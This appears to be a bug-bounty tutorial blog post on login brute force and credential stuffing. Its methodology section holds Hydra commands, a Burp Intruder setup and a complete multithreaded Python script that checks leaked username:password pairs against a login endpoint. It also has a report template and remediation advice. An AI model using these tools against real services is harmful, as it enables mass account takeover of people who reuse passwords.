# Login Brute Force & Credential Stuffing

> **Severity:** HIGH → CRITICAL (no MFA)
> **OWASP:** A07 – Identification & Authentication Failures
> **CWE:** CWE-307 – Improper Restriction of Excessive Authentication Attempts
> **Bug Bounty Payouts:** $300 – $5,000+

---

## What Is It?

Think of a padlock. You know the shape, you just don't know the combination. Brute force means trying every combination until one works. Credential stuffing means you found someone else's combination written on a wall (a leaked database) and you're trying it on every padlock in town.

**Brute Force** = automated login attempts using password lists against a target  
**Credential Stuffing** = using real leaked username:password pairs from breach databases

The difference matters for severity. Brute force is loud and slow. Credential stuffing is surgical — it uses real credentials that work 2-8% of the time across any platform where users reuse passwords.

---

## Why It's Still P1-Grade in 2024

Password reuse is at ~65% across platforms. Combined with the billions of credentials in breach compilations (RockYou2021 = 8.4 billion entries), most applications are one unprotected endpoint away from mass account takeover.

No rate limiting + no lockout + no MFA = **game over**.

---

## Attack Methodology

### Step 1 — Identify the Login Endpoint

Map every authentication surface:

```
/login              POST  (main web form)
/api/auth/login     POST  (mobile/API login)
/api/v1/token       POST  (JWT token endpoint)
/admin/login        POST  (admin panel)
/oauth/token        POST  (OAuth password grant)
```

GraphQL mutations also count:
```graphql
mutation { login(username: "admin", password: "FUZZ") { token } }
```

### Step 2 — Test for Rate Limiting

Before launching any attack, verify there's actually no protection:

```python
import requests, time

url = "https://target.com/api/auth/login"
for i in range(25):
    r = requests.post(url, json={"username":"admin","password":f"test{i}"})
    print(f"[{i+1}] Status: {r.status_code}  Len: {len(r.text)}")
    # No 429? No lockout message? = VULNERABLE
```

If you get 25 consistent `200` or `401` responses with no `429` or lockout — that's your finding.

### Step 3 — Brute Force with Hydra

```bash
# HTTP POST form
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 10 -w 3

# JSON API
hydra -L users.txt -P rockyou.txt target.com \
  http-post-form \
  "/api/auth/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:error" \
  -H "Content-Type: application/json"
```

### Step 4 — Burp Suite Intruder (Cluster Bomb)

For simultaneous username + password testing:

```
Attack type: Cluster Bomb
Payload Set 1 (username): §admin§
Payload Set 2 (password): §password§

POST /login
{"username":"§admin§","password":"§password§"}
```

Load `SecLists/Usernames/` for set 1 and `SecLists/Passwords/` for set 2. Sort by response length to find successful logins.

### Step 5 — Credential Stuffing

```python
#!/usr/bin/env python3
"""
Credential Stuffing — validate leaked pairs against target
Usage: python3 stuff.py -c creds.txt -t https://target.com/api/login
"""
import requests, argparse
from concurrent.futures import ThreadPoolExecutor

def test_cred(line, target, session):
    try:
        user, pwd = line.strip().split(":", 1)
        r = session.post(target,
            json={"username": user, "password": pwd},
            timeout=8, allow_redirects=False)
        if r.status_code in [200, 302] and "token" in r.text.lower():
            return f"[HIT] {user}:{pwd}"
        return None
    except:
        return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c","--creds",  required=True)
    parser.add_argument("-t","--target", required=True)
    parser.add_argument("-T","--threads",type=int, default=5)
    args = parser.parse_args()

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"

    creds = open(args.creds).readlines()
    print(f"[*] Testing {len(creds)} credential pairs")

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        results = list(ex.map(lambda l: test_cred(l, args.target, session), creds))

    hits = [r for r in results if r]
    print(f"\n[+] {len(hits)} valid credentials found:")
    for h in hits:
        print(f"  {h}")

if __name__ == "__main__":
    main()
```

---

## Wordlist Resources

| List | Path | Use Case |
|---|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | General passwords |
| Common-Credentials 10k | SecLists/Passwords/Common-Credentials/ | Quick check |
| top-usernames-shortlist | SecLists/Usernames/ | Username list |
| darkweb2017-top10000 | SecLists/Passwords/ | Real-world passwords |
| HaveIBeenPwned dumps | HIBP API or bulk download | Credential stuffing |

---

## Severity Rating

| Condition | Severity |
|---|---|
| No rate limit + no MFA | **Critical** |
| No rate limit + MFA enforced | **High** |
| Weak rate limit (resets quickly) | **High** |
| Lockout exists, no bypass | **Medium** |
| CAPTCHA + MFA + rate limit | **Info/NA** |
| Admin panel exposed, no protection | **Critical** |

---

## Bug Report Template

```
Title: No Rate Limiting on Login Endpoint Allows Brute Force Attack

Severity: High

Summary:
The /api/auth/login endpoint does not implement rate limiting or
account lockout. An attacker can send unlimited login attempts
without any throttling, enabling brute force or credential stuffing
attacks against user accounts.

Steps to Reproduce:
1. Send POST /api/auth/login {"username":"admin","password":"test1"}
   Response: 401 {"error":"Invalid credentials"}

2. Repeat 100 times in rapid succession.
   All 100 return 401 — no 429, no lockout, no CAPTCHA triggered.

3. Using rockyou.txt top 1000: password "admin123" succeeded
   on attempt 847. Total time: 12 seconds.

Evidence: [Burp Intruder screenshot showing 100+ attempts, 0 blocks]

Impact:
An attacker can enumerate valid credentials via brute force,
enabling full account takeover. Combined with credential stuffing
using breach data, large-scale account compromise is feasible.

Remediation:
- Rate limit to 5 attempts/minute per IP
- Account lockout after 10 consecutive failures (15 min)
- CAPTCHA after 3 failed attempts
- Enforce MFA for all accounts

CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — Score: 9.1 (Critical)
```

---

## Key Takeaway

**The attack is simple. The finding is high. The fix is 3 lines of code.**

Rate limiting is table stakes. If a login endpoint lets you try 1,000 passwords in 60 seconds — that's a valid P1 on most programs. Don't overlook the basics. The boring bugs pay the best bounties.

---

*#300DaysWithAppSec | Day 19 | Login Brute Force & Credential Stuffing*

---

**Connect:**
- LinkedIn: [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369)
- GitHub: [github.com/anand87794](https://github.com/anand87794)
- Portfolio: [anandprajapati.lovable.app](https://anandprajapati.lovable.app)
- X: [@anand87794](https://x.com/anand87794)

@anand87794
